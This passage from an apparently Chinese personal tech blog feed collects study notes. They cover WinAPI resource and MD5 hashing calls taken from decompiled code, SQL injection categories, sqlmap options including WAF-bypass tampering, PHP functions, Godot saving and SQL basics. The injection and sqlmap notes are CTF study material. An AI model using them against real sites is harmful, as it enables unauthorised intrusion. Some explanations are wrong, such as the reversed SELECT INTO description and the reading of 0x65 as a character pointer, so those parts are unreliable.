<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HRSRC <span class="title function_">FindResourceA</span><span class="params">(</span></span><br><span class="line"><span class="params">  HMODULE hModule,          <span class="comment">// 模块句柄</span></span></span><br><span class="line"><span class="params">  LPCSTR lpName,            <span class="comment">// 资源名称</span></span></span><br><span class="line"><span class="params">  LPCSTR lpType             <span class="comment">// 资源类型</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>hModule</code> 参数指定了模块句柄。<ul>
<li><code>0</code> 表示该函数将搜索当前进程的可执行文件（EXE）或者动态链接库（DLL）中的资源。因此，<code>0</code> 实际上指的是当前进程本身。</li>
</ul>
</li>
<li><code>lpName</code> 参数指定了资源的名称。<ul>
<li>在这个例子中，<code>0x65</code> 是一个整数常量，表示资源的名称（以字符串形式传递时，会进行转换）。由于 <code>(LPCSTR)0x65</code> 表示将数字 <code>0x65</code> 强制转换为 <code>LPCSTR</code> 类型，这里的 <code>0x65</code> 是一个指向某个特定字符串资源的地址，通常是一个字符。</li>
</ul>
</li>
<li><code>0x65</code> 对应的 ASCII 字符是 <code>&#39;e&#39;</code>，因此，传递的资源名称实际上是一个指向字符 <code>&#39;e&#39;</code> 的指针。<ul>
<li>但值得注意的是，这并不意味着它是字符串 <code>&quot;e&quot;</code>，而是一个内存地址，所以需要结合上下文来看。如果程序的资源文件中包含一个以 <code>&#39;e&#39;</code> 为标识符的资源，这种写法就能匹配到该资源。</li>
</ul>
</li>
<li><code>lpType</code> 是资源的类型，这里是一个常量字符串 <code>&quot;AAA&quot;</code>，表示要查找的资源的类型。<ul>
<li>资源类型可以是 <code>&quot;RT_BITMAP&quot;</code>（位图），<code>&quot;RT_ICON&quot;</code>（图标），<code>&quot;RT_STRING&quot;</code>（字符串表）等。这里 <code>&quot;AAA&quot;</code> 是一个用户自定义的资源类型标识符。</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>网络安全</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-20-WinAPICrypt</title>
    <url>/2024/11/20/2024-11-20-WinAPICrypt/</url>
    <content><![CDATA[<h2 id="Windows加密API-CryptAcquire"><a href="#Windows加密API-CryptAcquire" class="headerlink" title="Windows加密API CryptAcquire"></a>Windows加密API CryptAcquire</h2><p>函数一</p>
<p><code>CryptAcquireContextA</code> 获取 <code>CSP</code> （获取加密服务提供者） 句柄，初始化加密操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CryptAcquireContextA</span><span class="params">(</span></span><br><span class="line"><span class="params">  HCRYPTPROV  *phProv,          <span class="comment">// 指向加密提供者句柄的指针</span></span></span><br><span class="line"><span class="params">  LPCSTR      pszContainer,     <span class="comment">// 密钥容器的名称</span></span></span><br><span class="line"><span class="params">  LPCSTR      pszProvider,      <span class="comment">// 加密服务提供者的名称（如果为空，系统会使用默认值）</span></span></span><br><span class="line"><span class="params">  DWORD       dwProvType,       <span class="comment">// 加密提供者的类型</span></span></span><br><span class="line"><span class="params">  DWORD       dwFlags           <span class="comment">// 标志</span></span></span><br><span class="line"><span class="params">)</span>;<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>反汇编代码中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0xF0000000</span>) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p><code>CryptCreateHash</code> 哈希对象可以在之后的操作中用于计算消息的哈希值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CryptCreateHash</span><span class="params">(</span></span><br><span class="line"><span class="params">  HCRYPTPROV  hProv,           <span class="comment">// 提供者句柄</span></span></span><br><span class="line"><span class="params">  ALG_ID      Algid,           <span class="comment">// 哈希算法标识符</span></span></span><br><span class="line"><span class="params">  HCRYPTKEY   hKey,            <span class="comment">// 可选的密钥句柄</span></span></span><br><span class="line"><span class="params">  DWORD       dwFlags,         <span class="comment">// 标志</span></span></span><br><span class="line"><span class="params">  HCRYPTHASH  *phHash          <span class="comment">// 返回的哈希句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>反汇编代码中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( CryptCreateHash(phProv, <span class="number">0x8003</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash) )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p><code>CryptHashData</code> 用于将数据（如文件、消息等）传递给哈希对象以便进行哈希计算。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CryptHashData</span><span class="params">(</span></span><br><span class="line"><span class="params">  HCRYPTHASH  hHash,           <span class="comment">// 哈希对象句柄</span></span></span><br><span class="line"><span class="params">  <span class="type">const</span> BYTE  *pbData,         <span class="comment">// 数据指针</span></span></span><br><span class="line"><span class="params">  DWORD       dwDataLen,       <span class="comment">// 数据长度</span></span></span><br><span class="line"><span class="params">  DWORD       dwFlags          <span class="comment">// 标志</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>反汇编代码中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="number">0</span>) )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p><code>CryptGetHashParam</code> 用于获取哈希对象的参数（例如，计算的哈希值）。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">CryptGetHashParam</span><span class="params">(</span></span><br><span class="line"><span class="params">  HCRYPTHASH  hHash,           <span class="comment">// 哈希对象句柄</span></span></span><br><span class="line"><span class="params">  DWORD       dwParam,         <span class="comment">// 参数类型</span></span></span><br><span class="line"><span class="params">  BYTE        *pbData,         <span class="comment">// 输出缓冲区</span></span></span><br><span class="line"><span class="params">  DWORD       *pdwDataLen,     <span class="comment">// 输出数据长度</span></span></span><br><span class="line"><span class="params">  DWORD       dwFlags          <span class="comment">// 标志</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>反汇编代码中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CryptGetHashParam(phHash, <span class="number">2u</span>, v6, &amp;pdwDataLen, <span class="number">0</span>);</span><br><span class="line">    *lpString1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; pdwDataLen; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      wsprintfA(String2, <span class="string">&quot;%02X&quot;</span>, v6[i]);</span><br><span class="line">      lstrcatA(lpString1, String2);</span><br><span class="line">    &#125;</span><br><span class="line">    CryptDestroyHash(phHash);</span><br><span class="line">    CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>完整加密过程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401040</span><span class="params">(BYTE *pbData, DWORD dwDataLen, LPSTR lpString1)</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD i; <span class="comment">// [esp+4Ch] [ebp-24h]</span></span><br><span class="line">  CHAR String2[<span class="number">4</span>]; <span class="comment">// [esp+50h] [ebp-20h] BYREF</span></span><br><span class="line">  BYTE v6[<span class="number">16</span>]; <span class="comment">// [esp+54h] [ebp-1Ch] BYREF</span></span><br><span class="line">  DWORD pdwDataLen; <span class="comment">// [esp+64h] [ebp-Ch] BYREF</span></span><br><span class="line">  HCRYPTHASH phHash; <span class="comment">// [esp+68h] [ebp-8h] BYREF</span></span><br><span class="line">  HCRYPTPROV phProv; <span class="comment">// [esp+6Ch] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CryptAcquireContextA(&amp;phProv, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0xF0000000</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CryptCreateHash(phProv, <span class="number">0x8003</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;phHash) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( CryptHashData(phHash, pbData, dwDataLen, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      CryptGetHashParam(phHash, <span class="number">2u</span>, v6, &amp;pdwDataLen, <span class="number">0</span>);</span><br><span class="line">      *lpString1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; pdwDataLen; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        wsprintfA(String2, <span class="string">&quot;%02X&quot;</span>, v6[i]);</span><br><span class="line">        lstrcatA(lpString1, String2);</span><br><span class="line">      &#125;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CryptDestroyHash(phHash);</span><br><span class="line">      CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CryptReleaseContext(phProv, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>2024-11-21-SQLBase</title>
    <url>/2024/11/21/2024-11-21-SQLBase/</url>
    <content><![CDATA[<h3 id="SQL注入基本思路"><a href="#SQL注入基本思路" class="headerlink" title="SQL注入基本思路"></a>SQL注入基本思路</h3><h4 id="检查回显"><a href="#检查回显" class="headerlink" title="检查回显"></a>检查回显</h4><p>在此基础下 </p>
<ul>
<li><p>判断闭合方式：</p>
</li>
<li><p>判断字段数：</p>
</li>
<li><p>判断回显位：服务端执行SQL语句查询数据库中的数据，客户端显示数据的位置就是回显位。</p>
</li>
</ul>
<p>根据注入类型选择注入方式</p>
<ul>
<li><p>报错注入：</p>
<ul>
<li><p>显示报错信息时可以使用的注入方式</p>
</li>
<li><p>原理</p>
<ul>
<li>通过特殊函数错误，使其输出错误结果来获取信息。</li>
</ul>
</li>
</ul>
</li>
<li><p>盲注:</p>
<ul>
<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值 <ul>
<li>页面结果仅有True或者False</li>
<li>那么就通过这个判断来获取页面的相关信息</li>
</ul>
</li>
<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断<ul>
<li>一般思路：<ul>
<li>延迟注入：利用 <code>sleep()</code> 或 <code>benchmark()</code> 等函数让时间变长，结果判断语句<code>if(expr1, expr2, expr3)</code>，通过页面响应时间来判断语句返回的值是<code>True</code> 还是 <code>False</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>堆叠注入：有的应用可以加入 <code>;</code> 后一次执行多条语句</p>
</li>
<li><p>联合查询注入</p>
</li>
<li><p>二次注入</p>
</li>
<li><p><a href="https://cs-cshi.github.io/cybersecurity/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/]">宽字节注入</a>：</p>
<ul>
<li>什么是宽字节：  宽字节是相对于ascII这样单字节而言的；像 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节</li>
<li>转义函数：为了过滤数据对特殊字符加上反斜杠”\“ 进行转义<ul>
<li>如：MySQL的<code>addslashes()</code>，<code>mysql_real_escape_string()</code>，<code>mysql_escape_string()</code></li>
</ul>
</li>
</ul>
</li>
<li><p>HTTP头部注入</p>
</li>
</ul>
<hr>
<p>转自大佬的blog：</p>
<p>https:&#x2F;&#x2F;websec.readthedocs.io&#x2F;zh&#x2F;latest&#x2F;vuln&#x2F;sql&#x2F;classify.html</p>
<p>注入类型根据获取数据的方式分为3类</p>
<h3 id="inband"><a href="#inband" class="headerlink" title="inband"></a>inband</h3><p>利用Web应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>
<h3 id="inference"><a href="#inference" class="headerlink" title="inference"></a>inference</h3><p>通过Web的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过web应用的其他改变来推断数据。</p>
<h3 id="out-of-band-OOB"><a href="#out-of-band-OOB" class="headerlink" title="out of band (OOB)"></a>out of band (OOB)</h3><p>通过其他传输方式来获得数据，比如DNS解析协议和电子邮件。</p>
]]></content>
  </entry>
  <entry>
    <title>2024-11-21-UseSQLMap</title>
    <url>/2024/11/21/2024-11-21-UseSQLMap/</url>
    <content><![CDATA[<h3 id="sqlMap使用"><a href="#sqlMap使用" class="headerlink" title="sqlMap使用"></a>sqlMap使用</h3><p>使用sqlmap可以快速的进行sql注入测试，节省时间提高效率。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-u：指定含有参数的URL</span><br><span class="line">--dbs：爆出数据库</span><br><span class="line">--batch：默认选择执行</span><br><span class="line">--random-agent：使用随机user-agent</span><br><span class="line">-r：POST注入</span><br><span class="line">--level：注入等级，一共有5个等级（1-5） 不加 level 时，默认是1，5级包含的payload最多，会自动破解出cookie、XFF等头部注入，相对应他的速度也比较慢</span><br><span class="line">--timeout：设定重试超时</span><br><span class="line">--cookie：设置cookie信息</span><br><span class="line">--flush-session：删除指定目标缓存，重新对该目标进行测试</span><br><span class="line">--tamper：使用waf绕过脚本</span><br><span class="line">--time-sec：设定延时时间，默认是5秒</span><br><span class="line">--thread：多线程，默认为1，最大为10</span><br><span class="line">--keep-live： sqlmap默认是一次连接成功后马上关闭；HTTP报文中相当于Connection: Close（一次连接马上关闭）。要扫描站点的URL比较多时，这样比较耗费性能，所以需要将HTTP连接持久化来提高扫描性能；HTTP报文相当于Connection: Keep-Alive</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-21-PHPBaseFun</title>
    <url>/2024/11/21/2024-11-21-PHPBaseFun/</url>
    <content><![CDATA[<h2 id="PHP的一些基础函数记录"><a href="#PHP的一些基础函数记录" class="headerlink" title="PHP的一些基础函数记录"></a>PHP的一些基础函数记录</h2><p>由于不常用PHP写项目，在CTF WEB 方向中经常使用PHP的各种函数，使用过程中经常忘记用法甚至陌生，导致源码审计收到阻碍，故在此记录一些PHP的常用函数。</p>
<hr>
<p><code>json_decode()</code> 用于将 JSON 格式的字符串转换为 PHP 变量。通常用于从 JSON 数据中解析出数组或对象，以便在 PHP 中进一步处理。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">json_decode</span>(<span class="keyword">string</span> <span class="variable">$json</span>, <span class="keyword">bool</span> <span class="variable">$assoc</span> = <span class="literal">false</span>, <span class="keyword">int</span> <span class="variable">$depth</span> = <span class="number">512</span>, <span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>$json</strong> (string)：要解码的 JSON 字符串。</li>
<li><strong>$assoc</strong> (bool)：如果设为 <code>true</code>，返回关联数组；如果设为 <code>false</code>（默认值），返回对象。</li>
<li><strong>$depth</strong> (int)：设置递归的最大深度，默认是 512。</li>
<li><strong>$options</strong> (int)：设置解码选项，常用的值有 <code>JSON_BIGINT_AS_STRING</code> 等。</li>
</ul>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$json</span> = <span class="string">&#x27;&#123;&quot;person&quot;: &#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30&#125;, &quot;address&quot;: &quot;New York&quot;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;person&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];  <span class="comment">// 输出 &quot;John&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<p><code>isset()</code>用于检查一个变量是否已经被设置并且值不为 <code>NULL</code>。它返回一个布尔值，<code>true</code> 表示变量已被设置并且不是 <code>NULL</code>，否则返回 <code>false</code> 。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="keyword">mixed</span> <span class="variable">$var</span>, <span class="keyword">mixed</span> ...<span class="variable">$vars</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>$var</strong>：需要检查的变量。</li>
<li><strong>$vars</strong>：可选的，检查多个变量。</li>
</ul>
<hr>
<p><code>ini_set</code> 函数用于设置 PHP 配置选项，允许你在运行时修改 PHP 配置值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="keyword">string</span> <span class="variable">$varname</span>, <span class="keyword">string</span> <span class="variable">$newvalue</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>$varname</code>：配置选项的名称（例如：<code>display_errors</code>、<code>max_execution_time</code>）。</li>
<li><code>$newvalue</code>：设置的新值。</li>
</ul>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);  <span class="comment">// 设置allow_url_include为打开</span></span><br></pre></td></tr></table></figure>

<p>作用：允许 PHP 通过 URL 引入文件。</p>
<hr>
<p><code>header()</code> 函数用于发送原始 HTTP 头信息。可以通过它来设置响应头，例如重定向、设置内容类型、缓存控制等。
    规则：<code>header()</code> 函数必须在输出任何内容之前调用。</p>
<ul>
<li><code>$header</code>：要发送的 HTTP 头信息。</li>
<li><code>$replace</code>：如果为 <code>true</code>，则替换掉已存在的相同头；如果为 <code>false</code>，则不会替换。</li>
<li><code>$response_code</code>：设置响应的 HTTP 状态码。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="keyword">string</span> <span class="variable">$header</span>, <span class="keyword">bool</span> <span class="variable">$replace</span> = <span class="literal">true</span>, <span class="keyword">int</span> <span class="variable">$response_code</span> = <span class="number">0</span>): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>

<p>example:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>); </span><br><span class="line">设置内容类型为 text/html 字符编码集为utf-<span class="number">8</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-21-Godot存档</title>
    <url>/2024/11/21/2024-11-21-Godot%E5%AD%98%E6%A1%A3/</url>
    <content><![CDATA[<h3 id="存档实现"><a href="#存档实现" class="headerlink" title="存档实现"></a>存档实现</h3><h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>使用 <code>Resource</code> 类</p>
<p>图片，音频，脚本，都以此格式调用</p>
<p>默认状态下无法保存任何东西</p>
<p>但是可以以此创建新类</p>
<p>创建代码 &gt;&gt; 选择代码继承自 <code>Rersource</code></p>
<hr>
<p>创建 <code>class_name SceneData</code> </p>
<p>保存玩家状态，创建二位矢量变量</p>
<p>想以文件形式保存，需要加<code>@export</code> 关键词</p>
<p>希望保存方向 就保存关键词</p>
<p>C# 写法</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Godot;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">PlayerData</span> : <span class="title">Resource</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Export</span>] <span class="keyword">public</span> <span class="built_in">int</span> money;</span><br><span class="line">    [<span class="meta">Export</span>] <span class="keyword">public</span> <span class="built_in">bool</span> IsNovice;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="保存按钮的设计"><a href="#保存按钮的设计" class="headerlink" title="保存按钮的设计"></a>保存按钮的设计</h4><p>通过实例化 <code>SceneData</code> 来进行数据保存</p>
<p>通过<code>@export</code> 关键词设置的变量可以连接到<code>Player</code>的对象，获取<code>Player</code>对象的属性。</p>
<p>通过<code>player.get_child(0)</code>获取第一个子节点</p>
<p>然后就可以访问字节点的内容</p>
<p>然后设置实例化的对象的属性，将对象使用<code>ResourceSaver.save()</code>来保存即可。</p>
<p><code>save()</code>方法填两个参数，资源对象和路径。</p>
<p>路径可以选择<code>user://</code></p>
<p>不同的文件后缀名会存在不同的编码</p>
<p><code>res</code>后缀为二进制格式</p>
<p><code>tres</code>后缀为可阅读编码格式</p>
<p>Example Code:</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> _on_save()&#123;</span><br><span class="line"></span><br><span class="line">    playerHero = GetNode&lt;PlayerHero&gt;(<span class="string">&quot;PlayerHero&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> playerData = <span class="keyword">new</span> PlayerData();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    playerData.money = playerHero.money;</span><br><span class="line">    playerData.IsNovice = playerHero.IsNovice;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ResourceSaver.Save(playerData, <span class="string">&quot;user://PlayerData.res&quot;</span>);</span><br><span class="line">    GD.Print(<span class="string">&quot;存档成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="读取存档"><a href="#读取存档" class="headerlink" title="读取存档"></a>读取存档</h3><p>通过 <code>ResourceLoader.load()</code>方法直接读取存档文件即可。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> data = ResourceLoader.load() <span class="keyword">as</span> SceneData</span><br></pre></td></tr></table></figure>

<p>ps: 注意这里使用load返回后需要转为SceneData对象，否则无法访问相关属性</p>
<p><code>上述为代码为GDScript</code> C#应该有其他的写法</p>
<p>读取后将玩家的属性设置为存档中的内容即可</p>
<p>Example Code:</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> _on_load()&#123;</span><br><span class="line">    <span class="keyword">var</span> data = ResourceLoader.Load(<span class="string">&quot;user://PlayerData.res&quot;</span>) <span class="keyword">as</span> PlayerData;</span><br><span class="line"></span><br><span class="line">    playerHero.IsNovice = data.IsNovice;</span><br><span class="line">    GD.Print(data.IsNovice);</span><br><span class="line">    GD.Print(<span class="string">&quot;读档成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">    _Ready();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="More-Example-About-PackedScene"><a href="#More-Example-About-PackedScene" class="headerlink" title="More Example About PackedScene"></a>More Example About PackedScene</h4><h5 id="SAVE部分"><a href="#SAVE部分" class="headerlink" title="SAVE部分"></a>SAVE部分</h5><p>节点的各种属性（大小，位置，状态）都可以打包为 PackedScene</p>
<p><code>@export var box_array: Array[PackedScene]</code></p>
<p>通过一个<code>Array</code>来保存所有物体的状态</p>
<ul>
<li>获取所有物体的方法<ul>
<li>使用<code>group</code>分组功能 可以获得同属于此组的节点</li>
<li>属于同一组的物体会被打上同一个标签</li>
<li>于 <code>Node</code> &gt;&gt;&gt; <code>Group</code> 面板设置分组</li>
<li>通过<code>get_tree().get_nodes_in_group(&quot;Box&quot;)</code>获取全部<code>Box</code>标签的物体</li>
</ul>
</li>
</ul>
<p>示例代码</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> boxes = get_tree().get_nodes_in_group(<span class="string">&quot;Box&quot;</span>)</span><br><span class="line">    <span class="comment">// 获取全部 Box 标签的文件对象</span></span><br><span class="line"><span class="keyword">for</span> box <span class="keyword">in</span> boxes:</span><br><span class="line">	<span class="keyword">var</span> box_scene = PackedScene.<span class="keyword">new</span>()</span><br><span class="line">     box_scene.pack(box)</span><br><span class="line">  	 data.box_array.append(box_scene) <span class="comment">// 也就是把每个box box_scene.pack进去后就直接添加给 data.box_array就可以了</span></span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<h5 id="LOAD部分"><a href="#LOAD部分" class="headerlink" title="LOAD部分"></a>LOAD部分</h5><p>先把当前箱子节点删了，然后通过存档来设置和创建节点。</p>
<ul>
<li>通过<code>get_tree().get_nodes_in_group(&quot;Box&quot;)</code>获取全部<code>Box</code>标签的物体</li>
<li>然后将其循环遍历所有物体</li>
<li>使用 <code>box.queue_free()</code> 删除当前存在的箱子节点</li>
<li>同时循环所有的存档中的box 并 使用<code>box.instantiate()</code>将其转换为节点</li>
<li>使用<code>get_tree().current_scene.add_child(box_node)</code> 将其加入到场景树中</li>
</ul>
<h4 id="加载碰撞体"><a href="#加载碰撞体" class="headerlink" title="加载碰撞体"></a>加载碰撞体</h4><p>勾选<code>Freeze</code>属性让其无法参与物理计算</p>
<p>设置 box_node.freeze &#x3D; ture </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> data = ResourceLoader.load(<span class="string">&quot;路径&quot;</span>) <span class="keyword">as</span> SceneData</span><br><span class="line">player.global_position = data.player_posision</span><br><span class="line">player.get_child(<span class="number">0</span>).flip_h = data.<span class="function">is_facing_left</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> box <span class="keyword">in</span> <span class="title">get_tree</span>().<span class="title">get_nodes_in_group</span>(<span class="params"><span class="string">&quot;分组名&quot;</span></span>):</span></span><br><span class="line"><span class="function">	box.<span class="title">queue_free</span>()</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> box <span class="keyword">in</span> data.box_array:</span></span><br><span class="line"><span class="function">	<span class="keyword">var</span> box_node</span> = box.instantiate()</span><br><span class="line">     get_tree().current_scene.add_child(box_node)</span><br><span class="line">     box_node.feeeze = <span class="literal">true</span> <span class="comment">// 冻结</span></span><br><span class="line"><span class="keyword">await</span> get_tree().create_time(<span class="number">0.1</span>).timeout <span class="comment">// 等待</span></span><br><span class="line"><span class="function"><span class="keyword">for</span> box <span class="keyword">in</span> <span class="title">get_tree</span>().<span class="title">get_nodes_in_group</span>(<span class="params"><span class="string">&quot;分组名&quot;</span></span>):</span></span><br><span class="line"><span class="function">	box_node.feeeze</span> = <span class="literal">false</span> <span class="comment">// 解冻</span></span><br></pre></td></tr></table></figure>



<p>知识点来源于：</p>
<p>【【Godot干货】优雅地保存任何数据！基于Resource类的存档系统】</p>
<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113314625624983&bvid=BV1TEmAYLEsM&cid=26309886617&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>

]]></content>
      <tags>
        <tag>C#</tag>
        <tag>godot</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-22-SQLBaseUse</title>
    <url>/2024/11/22/2024-11-22-SQLBaseUse/</url>
    <content><![CDATA[<h3 id="SQL基础使用"><a href="#SQL基础使用" class="headerlink" title="SQL基础使用"></a>SQL基础使用</h3><p><code>DISTINCT</code>: 用于返回不同的值，去除重复的记录。</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column_name <span class="keyword">FROM</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure>

<p>数据表中选择 <code>column_name</code> 列的唯一值。</p>
<p><code>INTO</code> ：将查询结果插入到新表中或将数据导出。</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">INTO</span> new_table <span class="keyword">FROM</span> old_table;</span><br></pre></td></tr></table></figure>

<hr>
<p>将 <code>new_table</code> 的数据复制到 <code>old_table</code> 中。</p>
<p><code>VALUES</code>: 用于将查询结果插入到新表中或将数据导出。</p>
<p>Example: </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2) <span class="keyword">VALUES</span> (value1, value2);</span><br></pre></td></tr></table></figure>

<hr>
<p>向 table_name中 插入数据 <code>column1, column2</code> .</p>
<p><code>UPDATE</code> 更新表中的现有记录</p>
<ul>
<li><code>condition</code> 可以是一些逻辑判断式。</li>
</ul>
<p><code>SET</code> 基于<code>UPDATE</code> 语句使用，用来指定要更新的值和列</p>
<p>Example:</p>
